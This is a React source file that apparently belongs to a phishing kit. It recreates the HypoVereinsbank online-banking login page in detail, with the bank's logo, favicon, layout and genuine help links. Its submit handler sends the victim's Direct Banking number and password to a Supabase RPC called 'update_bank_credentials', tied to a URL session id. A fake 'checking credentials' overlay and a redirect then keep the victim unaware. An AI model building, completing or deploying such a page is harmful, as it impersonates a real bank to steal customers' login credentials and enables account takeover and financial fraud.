import { useState, useEffect, useRef } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Phone, ChevronRight, ArrowDownToLine, ExternalLink } from "lucide-react";
import bgAsset from "@/assets/hvb-login-bg-2880.webp.asset.json";
import unicreditAsset from "@/assets/hvb-unicredit.png.asset.json";
import ferrariAsset from "@/assets/hvb-ferrari.png.asset.json";
import checklisteAsset from "@/assets/hvb-checkliste.webp.asset.json";
import gluehbirneAsset from "@/assets/hvb-gluehbirne-buch.webp.asset.json";

const TEAL = "#007E8F";
const TEAL_DARK = "#006674";
const RED = "#E2001A";
const RED_HOVER = "#C50017";
const DARK = "#1A1A18";
const PANEL_BG = "#EEF2F3";
const WARN_BG = "#DCECEF";
const BORDER = "#CFD8DC";

const HVBLogo = ({ className = "" }: { className?: string }) => (
  <svg viewBox="0 0 200 28" xmlns="http://www.w3.org/2000/svg" className={className} aria-label="HypoVereinsbank">
    <path fill="#1A1A18" d="M39.8,21.7h-3.4V13h-6.1v5.1c0,2-1.6,3.6-3.6,3.6V5.6c0-1.9,1.6-3.5,3.6-3.5h0v8.3h6.1V5.5 c0-1.9,1.5-3.4,3.4-3.4h0V21.7zM49.8,7.1h3.3l-5.9,18.2c-0.4,1.2-1.5,2.1-3,2.1H43l2.3-6.6L40.7,7.1h3.7l2.6,9.6L49.8,7.1zM65.3,14.4c0,4.5-2.5,7.5-6.2,7.5c-0.8,0-1.4-0.1-1.9-0.2v2.5c0,1.8-1.5,3.3-3.2,3.3h-0.2V8.2l0.1-0.1 c1.3-0.7,2.9-1,4.9-1C62.8,7.1,65.3,9.9,65.3,14.4zM61.8,14.5c0-3.5-1-5.1-3.2-5.1c-0.6,0-1,0.1-1.5,0.2v9.9 c0.3,0.1,0.7,0.2,1.2,0.2C61.2,19.7,61.8,16.8,61.8,14.5zM78.7,14.5c0,4.5-2.4,7.4-6.3,7.4s-6.3-2.9-6.3-7.4c0-4.5,2.4-7.4,6.3-7.4C76.3,7.1,78.7,10,78.7,14.5zM75.5,14.5c0-1.5-0.4-5-3.1-5c-2.8,0-3,3.9-3,5c0,1.1,0.2,4.9,3,4.9C75.3,19.4,75.5,15.6,75.5,14.5zM92.4,2.1L87,19.4c-0.4,1.3-1.7,2.3-3.2,2.3h-0.9L76.7,2.1h3.7l4.3,15.2l3.7-12.9c0.4-1.4,1.8-2.3,3.3-2.3 L92.4,2.1zM102.8,14.6l-8.7,1.2c0.3,2.4,1.5,3.6,3.7,3.6c2.4,0,3.6-0.8,4.5-1.4l0,2.9c-0.9,0.5-2.5,1-4.9,1 c-4.2,0-6.8-2.9-6.8-7.4c0-4.4,2.3-7.3,6.2-7.3c3.8,0,5.9,2.5,5.9,6.9V14.6z M99.7,12.6c-0.1-2.9-1.9-3.2-2.9-3.2h-0.1 c-1.9,0.1-2.9,1.4-2.9,4L99.7,12.6zM108.9,7.1c0.6,0,1.3,0.1,1.9,0.2v2.8c-1.2-0.9-2.8-0.6-3.5-0.2v8.5c0,1.8-1.5,3.3-3.3,3.3h-0.2V8.3C105.3,7.6,106.7,7.1,108.9,7.1zM122.4,14.6l-8.7,1.2c0.3,2.4,1.5,3.6,3.7,3.6c2.4,0,3.6-0.8,4.5-1.4v2.9c-0.9,0.5-2.5,1-4.9,1 c-4.2,0-6.8-2.9-6.8-7.4c0-4.4,2.3-7.3,6.2-7.3c3.8,0,5.9,2.5,5.9,6.9V14.6z M119.4,12.6c-0.1-2.9-1.9-3.2-2.9-3.2h-0.1 c-1.9,0.1-2.9,1.4-2.9,4L119.4,12.6zM127,3.8c0,0.9-0.9,1.7-1.9,1.7c-1,0-1.9-0.8-1.9-1.7c0-1,0.8-1.7,1.9-1.7C126.1,2.1,127,2.9,127,3.8z M126.8,7.1v14.5h-0.2c-1.8,0-3.3-1.5-3.3-3.3V7.1L126.8,7.1zM133.9,7.1c4.9,0,5.6,2.7,5.6,4.4v10.2h-0.2c-1.8,0-3.3-1.5-3.3-3.3v-6.8c0-1-0.4-2.1-2.3-2.1 c-0.9,0-1.4,0.1-2,0.3c0,0.2,0,11.9,0,11.9h-3.5V8.2C129.8,7.6,132.2,7.1,133.9,7.1zM149.5,17.6c0,2.3-2,4.3-5.1,4.3c-1.6,0-3-0.5-3.9-1V18c1,1.2,2.3,1.5,3.5,1.5c1.3,0,2.2-0.8,2.2-1.9 c0-1.2-0.6-1.7-2.1-2.3c-2.7-1-3.3-2.6-3.3-4c0-2.2,1.8-4.1,4.5-4.1c1.6,0,2.4,0.4,3.4,1v2.6c-0.9-1.1-1.7-1.4-2.7-1.4 c-1.3,0-2,0.8-2,1.8c0,1.1,0.9,1.7,2.1,2.2C148.8,14.5,149.5,15.9,149.5,17.6zM154,2.1V8c0.6-0.2,1.4-0.3,2.1-0.3c3.7,0,6.2,2.7,6.2,7.3c0,4.4-2.3,6.9-6.4,6.9h-0.6 c-1.1,0-3.7-0.2-4.7-0.4V5.4c0-1.8,1.5-3.3,3.3-3.3H154z M154,19.7c0.3,0.1,1.1,0.1,1.6,0.1c2.4,0,3.5-1.8,3.5-5 c0-3-1-5.3-3.8-5.3c-0.5,0-1,0.1-1.4,0.2V19.7zM170.8,12.5v-1c0-1.8-1.1-2.3-2.8-2.3c-1.4,0-2.8,0.5-4.3,1.3V8.2c0.9-0.4,2.6-1.1,4.9-1.1 c2.9,0,5.4,1.5,5.4,5.1v9.2c-1,0.2-3.2,0.4-4.5,0.4h-0.7c-3.8,0-5.8-1.6-5.8-4.3C162.8,13.8,166.4,12.9,170.8,12.5z M170.8,14.1 c-3,0.3-4.9,0.9-4.9,3.3c0,1.8,1.1,2.6,3,2.6c0.7,0,1.6-0.1,1.9-0.1V14.1zM181,7.1c4.9,0,5.6,2.7,5.6,4.4v10.2h-0.2c-1.8,0-3.3-1.5-3.3-3.3v-6.8c0-1-0.4-2.1-2.3-2.1 c-0.9,0-1.4,0.1-2,0.3c0,0.2,0,11.9,0,11.9h-3.5V8.2C176.9,7.6,179.3,7.1,181,7.1zM191.6,18.3c0,1.9-1.5,3.4-3.4,3.4h0V5.5c0-1.9,1.5-3.4,3.4-3.4h0v11.8l4.3-6.4h3.2l-4.4,6.5l5.2,7.7h-3.6 l-4.7-7.2V18.3z" />
    <path fill="#E3000F" d="M11.9,6C11.9,5.9,11.9,5.9,11.9,6c0.2-0.3,0.1-0.5,0-0.6C11.8,5.3,10,4.2,10,4.2C9.9,4.2,9.8,4,9.8,3.8 c0-0.3,0.2-0.5,0.5-0.6c1.1-0.3,5.1-0.5,6.5-0.5c0.5,0,1.3,0,2,0l0,0c-2-1.7-4.6-2.7-7.4-2.7C5.1,0.1,0,5.2,0,11.5 c0,2.8,1,5.3,2.6,7.3v0c1.4-2.1,5-7.1,5.7-8.2c0.9-1.2,2.9-3.8,3.3-4.3l0,0L11.9,6zM4.4,20.5c1.9,1.5,4.3,2.4,6.9,2.4c6.3,0,11.4-5.1,11.4-11.4c0-1.9-0.5-3.7-1.3-5.3l0,0 c0.4-0.4,0.8-1,0.5-1.7c-0.1-0.2-0.5-0.7-0.6-0.9l0,0c0.3,0.8-0.3,1.4-0.7,1.7c-0.2,0.2-3.1,2.9-6.5,5.9c-3,2.6-6.3,5.3-8.3,6.7 c-2.7,2-3.3,2.3-3.3,2.3c-0.1,0-0.2,0.1-0.3,0.1c-0.2,0-0.3-0.1-0.4-0.2l0,0c0,0,0,0.1,0,0.1c0.3,0.5,0.8,1,1.1,1 c0.1,0,0.2,0,0.3-0.1C3.4,21.2,3.6,21.1,4.4,20.5L4.4,20.5z" />
    <path fill="#FFFFFF" d="M11.9,5.9c0.2-0.3,0.1-0.4,0-0.5C11.8,5.3,10,4.2,10,4.2C9.9,4.2,9.8,4,9.8,3.8c0-0.3,0.2-0.5,0.5-0.6 c1.1-0.3,5.1-0.5,6.5-0.5c0.6,0,1.9,0,2.7,0.1c0.9,0.1,1.6,0.3,1.8,0.7c0.3,0.9-0.2,1.4-0.6,1.8c-0.2,0.2-3.1,2.9-6.5,5.9c-3,2.6-6.3,5.3-8.3,6.7c-2.7,2-3.3,2.3-3.3,2.3c-0.1,0-0.2,0.1-0.3,0.1c-0.3,0-0.5-0.2-0.5-0.5c0-0.1,0-0.2,0.1-0.3c0,0,5.4-7.7,6.3-9c1-1.3,3.3-4.4,3.3-4.4S11.7,6.2,11.9,5.9z" />
  </svg>
);

const FAVICON =
  "data:image/svg+xml;utf8," +
  encodeURIComponent(
    `<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><rect width='24' height='24' fill='#E2001A'/><path fill='#fff' d='M12.9 6.4c.2-.3.1-.4 0-.5-.1-.1-2-1.3-2-1.3-.1 0-.2-.2-.2-.4 0-.3.2-.5.5-.6 1.1-.3 5.1-.5 6.5-.5.6 0 1.9 0 2.7.1.9.1 1.6.3 1.8.7.3.9-.2 1.4-.6 1.8-.2.2-3.1 2.9-6.5 5.9-3 2.6-6.3 5.3-8.3 6.7-2.7 2-3.3 2.3-3.3 2.3-.1 0-.2.1-.3.1-.3 0-.5-.2-.5-.5 0-.1 0-.2.1-.3 0 0 5.4-7.7 6.3-9 1-1.3 3.3-4.4 3.3-4.4s-.2.1 0-.1z'/></svg>`
  );

const NAV_ITEMS = [
  "Privatkunden",
  "Wealth Management & Private Banking",
  "Unternehmenskunden",
  "Nachhaltigkeit",
  "Über Uns",
  "Services",
];

const HINT_BG = "#bfebf3";
const HINT_FG = "#262626";
const HINT_X = "#007a91";
const HINT_BORDER = "#999";
const HINT_SHADOW = "0 5px 10px rgba(0, 0, 0, .2)";

const InfoHint = ({
  open,
  onToggle,
  onClose,
  children,
}: {
  open: boolean;
  onToggle: () => void;
  onClose: () => void;
  children: React.ReactNode;
}) => {
  const wrapRef = useRef<HTMLSpanElement>(null);
  useEffect(() => {
    if (!open) return;
    const handler = (e: MouseEvent) => {
      if (wrapRef.current && !wrapRef.current.contains(e.target as Node)) onClose();
    };
    document.addEventListener("mousedown", handler);
    return () => document.removeEventListener("mousedown", handler);
  }, [open, onClose]);

  return (
    <span ref={wrapRef} className="relative inline-flex items-center">
      <button
        type="button"
        onClick={(e) => {
          e.preventDefault();
          onToggle();
        }}
        aria-label="Hinweis anzeigen"
        className="inline-flex items-center justify-center rounded-full"
        style={{
          width: 14,
          height: 14,
          backgroundColor: "#262626",
          color: "#fff",
          fontSize: 10,
          fontWeight: 700,
          fontFamily: "Georgia, serif",
          lineHeight: 1,
        }}
      >
        i
      </button>
      {open && (
        <span
          role="dialog"
          className="absolute hidden lg:block"
          style={{
            left: "calc(100% + 14px)",
            top: "50%",
            transform: "translateY(-50%)",
            zIndex: 1111,
            width: 304,
            maxWidth: 304,
            backgroundColor: HINT_BG,
            backgroundClip: "padding-box",
            color: HINT_FG,
            fontFamily: "'UniCredit', Arial, Helvetica, sans-serif",
            border: `1px solid ${HINT_BORDER}`,
            borderRadius: 6,
            boxShadow: HINT_SHADOW,
            padding: 1,
            fontSize: 15,
            lineHeight: 1.5,
            textAlign: "left",
            textTransform: "none",
          }}
        >
          {/* Arrow border */}
          <span
            aria-hidden="true"
            style={{
              position: "absolute",
              left: -9,
              top: "50%",
              transform: "translateY(-50%)",
              width: 0,
              height: 0,
              borderTop: "8px solid transparent",
              borderBottom: "8px solid transparent",
              borderRight: `8px solid ${HINT_BORDER}`,
            }}
          />
          {/* Arrow fill */}
          <span
            aria-hidden="true"
            style={{
              position: "absolute",
              left: -8,
              top: "50%",
              transform: "translateY(-50%)",
              width: 0,
              height: 0,
              borderTop: "8px solid transparent",
              borderBottom: "8px solid transparent",
              borderRight: `8px solid ${HINT_BG}`,
            }}
          />
          <button
            type="button"
            onClick={(e) => {
              e.preventDefault();
              onClose();
            }}
            aria-label="Schließen"
            className="absolute inline-flex items-center justify-center"
            style={{
              top: 6,
              right: 8,
              width: 18,
              height: 18,
              color: HINT_X,
              background: "transparent",
              border: "none",
              cursor: "pointer",
              padding: 0,
            }}
          >
            <svg width="18" height="18" viewBox="0 0 18 18" aria-hidden="true" fill="none">
              <line x1="3" y1="3" x2="15" y2="15" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round" />
              <line x1="15" y1="3" x2="3" y2="15" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round" />
            </svg>
          </button>
          <span
            className="block"
            style={{ padding: "14px 36px 14px 18px" }}
          >
            {children}
          </span>
        </span>
      )}
    </span>
  );
};

const Hypovereinsbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [openHint, setOpenHint] = useState<null | "user" | "pw">(null);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);
  usePageMeta("LogIn | HypoVereinsbank (HVB)", FAVICON);

  const noop = (e: React.MouseEvent) => e.preventDefault();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: password,
        p_username_label: "Direct Banking Nummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div
        className="min-h-screen flex flex-col bg-white"
        style={{
          fontFamily: "'UniCreditMedium', Arial, Helvetica, sans-serif",
          color: DARK,
        }}
      >
        {/* Header */}
        <header
          className="w-full relative z-20 bg-white"
          style={{ boxShadow: "0 4px 12px rgba(0,0,0,0.08)" }}
        >
          <div className="flex items-stretch h-[72px] pl-4 lg:pl-6">
            <div className="max-w-[1360px] w-full mx-auto flex items-stretch">
              <a href="#" onClick={noop} className="flex items-center pr-12">
                <HVBLogo className="h-7 w-auto" />
              </a>
              <nav className="hidden lg:flex flex-1 items-center justify-start gap-7 text-[15px]">
                {NAV_ITEMS.map((n) => (
                  <a
                    key={n}
                    href="#"
                    onClick={noop}
                    className="text-center leading-tight text-[#4a4a4a] hover:text-black transition-colors"
                    style={{ maxWidth: 130 }}
                  >
                    {n}
                  </a>
                ))}
              </nav>
            </div>
            <div className="hidden lg:flex items-center gap-2 ml-auto">
              <span
                aria-hidden="true"
                className="self-stretch w-px shrink-0"
                style={{ backgroundColor: BORDER }}
              />
              {[
                { glyph: "\uEA2D", label: "SUCHE" },
                { glyph: "\uEA18", label: "HILFE" },
                { glyph: "\uEA26", label: "FILIALE" },
              ].map((it) => (
                <a
                  key={it.label}
                  href="#"
                  onClick={noop}
                  className="flex flex-col items-center justify-center px-3 py-2 text-[12px] text-[#4a4a4a] hover:text-black transition-colors"
                >
                  <span
                    aria-hidden="true"
                    style={{ fontFamily: "ucicons", fontSize: 20, lineHeight: 1 }}
                  >
                    {it.glyph}
                  </span>
                  <span className="mt-1 tracking-wide">{it.label}</span>
                </a>
              ))}
              <a
                href="#"
                onClick={noop}
                className="flex flex-col items-center justify-center text-white px-4 self-stretch text-[12px] tracking-wide"
                style={{ backgroundColor: RED, minWidth: 88, transition: "background-color 120ms" }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = RED_HOVER)}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = RED)}
              >
                <span
                  aria-hidden="true"
                  style={{ fontFamily: "ucicons", fontSize: 20, lineHeight: 1 }}
                >
                  {"\uEA1F"}
                </span>
                <span className="mt-1">BANKING</span>
                <span className="-mt-0.5">LOGIN</span>
              </a>
            </div>
            {/* Mobile: just login */}
            <div className="flex lg:hidden items-center ml-auto">
              <a
                href="#"
                onClick={noop}
                className="flex flex-col items-center justify-center text-white px-3 h-full text-[11px] tracking-wide"
                style={{ backgroundColor: RED, minWidth: 72, transition: "background-color 120ms" }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = RED_HOVER)}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = RED)}
              >
                <span
                  aria-hidden="true"
                  style={{ fontFamily: "ucicons", fontSize: 18, lineHeight: 1 }}
                >
                  {"\uEA1F"}
                </span>
                <span className="mt-0.5">BANKING LOGIN</span>
              </a>
            </div>
          </div>
        </header>

        {/* Login teaser */}
        <section
          className="relative w-full hvb-hero"
          style={{
            minHeight: 620,
            backgroundImage: `url(${bgAsset.url})`,
          }}
        >
          <div className="relative z-10 max-w-[1360px] mx-auto px-4 lg:px-6 py-10 lg:py-14 grid grid-cols-1 gap-6 lg:grid-cols-[460px_minmax(0,500px)] lg:gap-[100px] lg:justify-center">
            {/* Login card */}
            <div>
              <div className="bg-white shadow-md p-7 lg:p-9 max-w-[460px]">
                <h1 className="text-[28px] leading-tight font-light mb-5" style={{ color: DARK }}>
                  Willkommen im HVB Online Banking
                </h1>
                <p className="text-[16px] mb-4 font-semibold" style={{ color: DARK }}>
                  Bitte loggen Sie sich ein.
                </p>

                <form onSubmit={handleSubmit} autoComplete="off">
                  {/* hidden decoys to kill autofill */}
                  <input type="text" name="prevent_autofill" autoComplete="off" style={{ display: "none" }} />
                  <input type="password" name="prevent_autofill_pw" autoComplete="new-password" style={{ display: "none" }} />

                  <label className="block mb-4">
                    <span className="flex items-center gap-1.5 text-[16px] mb-1" style={{ color: DARK, fontFamily: "'UniCredit', Arial, Helvetica, sans-serif" }}>
                      Direct Banking Nummer
                      <InfoHint
                        open={openHint === "user"}
                        onToggle={() => setOpenHint(openHint === "user" ? null : "user")}
                        onClose={() => setOpenHint(null)}
                      >
                        Ihre Direct Banking Nummer finden Sie in Ihren Anmeldeunterlagen.
                      </InfoHint>
                    </span>
                    <input
                      type="text"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      autoComplete="off"
                      className="w-full h-10 px-3 text-[16px] bg-white outline-none"
                      style={{ border: `1px solid ${BORDER}` }}
                    />
                  </label>

                  <label className="block mb-5">
                    <span className="flex items-center gap-1.5 text-[16px] mb-1" style={{ color: DARK, fontFamily: "'UniCredit', Arial, Helvetica, sans-serif" }}>
                      Passwort
                      <InfoHint
                        open={openHint === "pw"}
                        onToggle={() => setOpenHint(openHint === "pw" ? null : "pw")}
                        onClose={() => setOpenHint(null)}
                      >
                        <p className="mb-2">
                          Bitte prüfen Sie, ob Sie Ihr 6-10-stelliges Passwort verwendet haben und nicht versehentlich Ihre appTAN PIN (Zahlenkombination, nur für Transaktionsfreigaben).
                        </p>
                        <p>
                          Sollten Sie sich erstmalig zum Online Banking anmelden, verwenden Sie bitte Ihren 5-stelligen Einstiegscode, welchen Sie bei der Registrierung erhalten haben.
                        </p>
                      </InfoHint>
                    </span>
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      autoComplete="new-password"
                      className="w-full h-10 px-3 text-[16px] bg-white outline-none"
                      style={{ border: `1px solid ${BORDER}` }}
                    />
                  </label>

                  <div className="flex items-center justify-between mb-5 gap-4">
                    <a
                      href="https://www.hypovereinsbank.de/hvb/services/digitales-banking/hilfe/password-direct-banking-pin-aendern"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-[15px] underline"
                      style={{ color: TEAL }}
                    >
                      Zugangsdaten vergessen/gesperrt?
                    </a>
                    <button
                      type="submit"
                      className="text-white text-[15px] tracking-wider px-6 h-10"
                      style={{ backgroundColor: TEAL, fontFamily: "'UniCredit', Arial, Helvetica, sans-serif" }}
                      onMouseOver={(e) => (e.currentTarget.style.backgroundColor = TEAL_DARK)}
                      onMouseOut={(e) => (e.currentTarget.style.backgroundColor = TEAL)}
                    >
                      ANMELDEN
                    </button>
                  </div>

                  <div className="text-[15px]" style={{ color: DARK }}>
                    <div className="font-semibold mb-1">Sie haben noch kein Online Banking?</div>
                    <div>
                      <a href="https://www.hypovereinsbank.de/hvb/services/online-banking/erstregistrierung" target="_blank" rel="noopener noreferrer" className="underline" style={{ color: TEAL }}>
                        Hier registrieren Sie sich
                      </a>{" "}
                      in wenigen Schritten.
                    </div>
                  </div>
                </form>

                {/* warning box */}
                <div
                  className="mt-6 -mx-7 lg:-mx-9 -mb-7 lg:-mb-9 px-7 lg:px-9 py-4"
                  style={{ backgroundColor: WARN_BG }}
                >
                  <div className="text-[13px] mb-1" style={{ color: "#4a4a4a" }}>
                    06.08.2026
                  </div>
                  <a
                    href="#"
                    onClick={noop}
                    className="text-[14px] font-semibold uppercase tracking-wide flex items-center gap-2 underline"
                    style={{ color: TEAL }}
                  >
                    Warnung - Vorsicht vor (Krypto-)Anlagebetrug!
                    <ExternalLink size={13} />
                  </a>
                </div>
              </div>
            </div>

            {/* Right side help text (desktop only) */}
            <div className="hidden lg:flex items-end">
              <div className="text-white max-w-[500px] mb-8">
                <h2 className="text-[28px] font-light leading-snug mb-2">
                  Hilfe &amp; Services – 24/7 erreichbar!
                </h2>
                <p className="text-[16px] mb-4" style={{ color: "#f1f1f1", fontFamily: "'UniCredit', Arial, Helvetica, sans-serif" }}>
                  PIN ändern? Adresse bearbeiten? Alle Lösungen für Ihren Servicebedarf finden Sie hier
                </p>
                <a
                  href="https://www.hypovereinsbank.de/portal?view=/de/services/digitales-banking/hilfe.jsp"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-flex items-center gap-1 text-[16px] uppercase tracking-wider underline"
                  style={{ fontFamily: "'UniCredit', Arial, Helvetica, sans-serif" }}
                >
                  Jetzt entdecken <ChevronRight size={14} />
                </a>
              </div>
            </div>
          </div>
        </section>

        {/* Help cards */}
        <section className="w-full" style={{ backgroundColor: "#E5EFF2" }}>
          <div className="max-w-[1200px] mx-auto px-4 lg:px-6 py-16">
            <h2 className="text-[24px] lg:text-[28px] font-light text-center mb-10" style={{ color: DARK }}>
              Finden Sie hier Hilfestellungen für Ihr HVB Online Banking:
            </h2>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {[
                {
                  title: "Ersteinrichtung: Step by Step Anleitung",
                  text: "Unser Welcome Guide erklärt Ihnen die einfache Einrichtung Ihres HVB Online & Mobile Bankings.",
                  cta: "Step by Step Anleitung",
                  icon: checklisteAsset,
                  alt: "Checkliste mit drei abgehakten Punkten",
                  href: "https://my.hypovereinsbank.de/content/dam/hypovereinsbank/services/pdf/HVB-Banking-App-Welcome-Guide-DE.pdf",
                },
                {
                  title: "Basisfunktionen",
                  text: "Finden Sie hier einen Überblick über die Basisfunktionen im Online Banking und wie diese angewendet werden.",
                  cta: "Basisfunktionen",
                  icon: gluehbirneAsset,
                  alt: "Aufgeschlagenes Buch mit Glühbirne",
                  href: "https://my.hypovereinsbank.de/content/dam/hypovereinsbank/services/pdf/HVB_Basic-Guide_Online-Banking.pdf",
                },
              ].map((card) => (
                <div key={card.title} className="bg-white p-10 text-center">
                  <img
                    src={card.icon.url}
                    alt={card.alt}
                    style={{ width: 72, height: 72, objectFit: "contain" }}
                    className="mx-auto mb-6 block"
                  />
                  <h3 className="text-[22px] font-normal mb-3" style={{ color: DARK }}>
                    {card.title}
                  </h3>
                  <p className="text-[15px] mb-5" style={{ color: "#4a4a4a" }}>
                    {card.text}
                  </p>
                  <a
                    href={card.href}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="inline-flex items-center gap-2 text-[15px] underline"
                    style={{ color: TEAL }}
                  >
                    <ArrowDownToLine size={14} /> {card.cta}
                  </a>
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* Contact band */}
        <section className="w-full" style={{ backgroundColor: "#007a91", color: "#fff" }}>
          <div className="max-w-[1200px] mx-auto px-4 lg:px-6 py-8 text-center">
            <h2 className="text-[28px] font-light mb-6">Sie haben eine Frage?</h2>
            <div className="flex items-center justify-center gap-5 mb-8">
              <Phone size={60} strokeWidth={1.25} />
              <div className="text-left">
                <a href="#" onClick={noop} className="text-[34px] leading-[1.1] font-light inline-flex items-center gap-2">
                  +49 89 378 488 88 <ChevronRight size={34} strokeWidth={1.5} />
                </a>
                <p className="text-[15px] mt-1" style={{ color: "#dff1f3" }}>
                  Mo – Fr: 08.00 – 20.00 Uhr und Sa: 08.00 – 14.00 Uhr
                </p>
              </div>
            </div>
            <div className="flex flex-wrap items-center justify-center gap-4">
              {[
                { t: "Zugang online beantragen", href: "https://www.hypovereinsbank.de/portal?view=/de/services/online-banking/erstregistrierung.jsp" },
                { t: "Kontaktieren Sie uns", href: "https://www.hypovereinsbank.de/portal?view=/de/kontaktwege/kontakt-privatkunden.jsp" },
                { t: "Filiale finden", href: "https://www.hypovereinsbank.de/portal?view=/de/kontaktwege/filiale.jsp" },
              ].map(({ t, href }) => (
                <a
                  key={t}
                  href={href}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="hvb-contact-btn px-6 py-3 text-[15px] border-2 border-white"
                  style={{ color: "#fff" }}
                >
                  {t}
                </a>
              ))}
            </div>
          </div>
        </section>

        {/* Footer */}
        <footer style={{ backgroundColor: "#262626", color: "#CCCCCC" }} className="flex-1">
          <div>
            <div className="border-t border-b mt-20" style={{ borderColor: "#CCCCCC" }}>
              <div className="max-w-[1200px] mx-auto px-4 lg:px-6 py-8 flex flex-col lg:flex-row lg:items-center gap-4">
                <p className="text-[15px] flex-1" style={{ color: "#CCCCCC" }}>
                  Möchten Sie einen Widerruf erklären? Diese Funktion ist nur für den Widerruf vorgesehen. Für Kündigungen nutzen Sie bitte die dafür vorgesehenen Wege.
                </p>
                <a
                  href="https://www.hypovereinsbank.de/portal?view=/de/footer/vertrags-widerruf.jsp"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-flex items-center gap-2 px-5 py-3 text-[14px] font-semibold uppercase tracking-wider self-start lg:self-auto"
                  style={{ border: "1px solid #CCCCCC", color: "#CCCCCC" }}
                >
                  Vertrag widerrufen <ChevronRight size={14} />
                </a>
              </div>
            </div>
          </div>

          <div>
            <div className="max-w-[1200px] mx-auto px-4 lg:px-6 py-6 flex flex-col items-center gap-y-3 text-[16px]" style={{ fontFamily: "'UniCredit', Arial, Helvetica, sans-serif" }}>
              {([
                [
                  ["Impressum", "https://www.hypovereinsbank.de/portal?view=/de/footer/impressum.jsp"],
                  ["Rechtliche Hinweise", "https://www.hypovereinsbank.de/portal?view=/de/footer/rechtliche-hinweise.jsp"],
                  ["Datenschutz", "https://www.hypovereinsbank.de/portal?view=/de/footer/datenschutz.jsp"],
                  ["Barrierefreiheit", "https://www.hypovereinsbank.de/portal?view=/de/footer/barrierefreiheit.jsp"],
                  ["Geschäftsbedingungen & Konditionen", "https://www.hypovereinsbank.de/portal?view=/de/footer/geschaeftsbedingungen-konditionen.jsp"],
                  ["Lob & Kritik", "https://www.hypovereinsbank.de/portal?view=/de/footer/beschwerdebearbeitung.jsp"],
                ],
                [
                  ["Whistleblowing & Meldungen i.S.d. LkSG", "https://www.hypovereinsbank.de/portal?view=/de/ueber-uns/das-unternehmen/compliance.jsp"],
                  ["Privatsphäre-Einstellungen", "javascript:UC.loadAndOpenCookieBanner();"],
                ],
              ] as [string, string][][]).map((row, r) => (
                <div key={r} className="flex flex-wrap justify-center items-center gap-y-3">
                  {row.map(([l, href], i, arr) => {
                    const isJs = href.startsWith("javascript:");
                    return (
                      <span key={l} className="flex items-center">
                        <a
                          href={href}
                          {...(isJs ? {} : { target: "_blank", rel: "noopener noreferrer" })}
                          className="hover:underline px-4"
                          style={{ color: "#CCCCCC" }}
                        >
                          {l}
                        </a>
                        {i < arr.length - 1 && (
                          <span aria-hidden className="hidden lg:block w-px shrink-0" style={{ height: 11, backgroundColor: "#CCCCCC", transform: "translateY(0.5px)" }} />
                        )}
                      </span>
                    );
                  })}
                </div>
              ))}
            </div>
          </div>


          <div className="max-w-[1200px] mx-auto px-4 lg:px-6 py-6 grid grid-cols-1 lg:grid-cols-3 items-center gap-4">
            <div className="hidden lg:block" />
            <div className="flex flex-col items-center gap-3">
              <p className="text-[16px]" style={{ color: "#CCCCCC", fontFamily: "'UniCredit', Arial, Helvetica, sans-serif" }}>© 2026 HypoVereinsbank</p>
              <img src={unicreditAsset.url} alt="UniCredit" className="w-[72px] h-[15px] opacity-90" />
            </div>
            <div className="flex items-center justify-center lg:justify-end gap-6">
              <img src={ferrariAsset.url} alt="Ferrari Premium Partner" className="w-[200px] h-[67px]" />
            </div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default Hypovereinsbank;
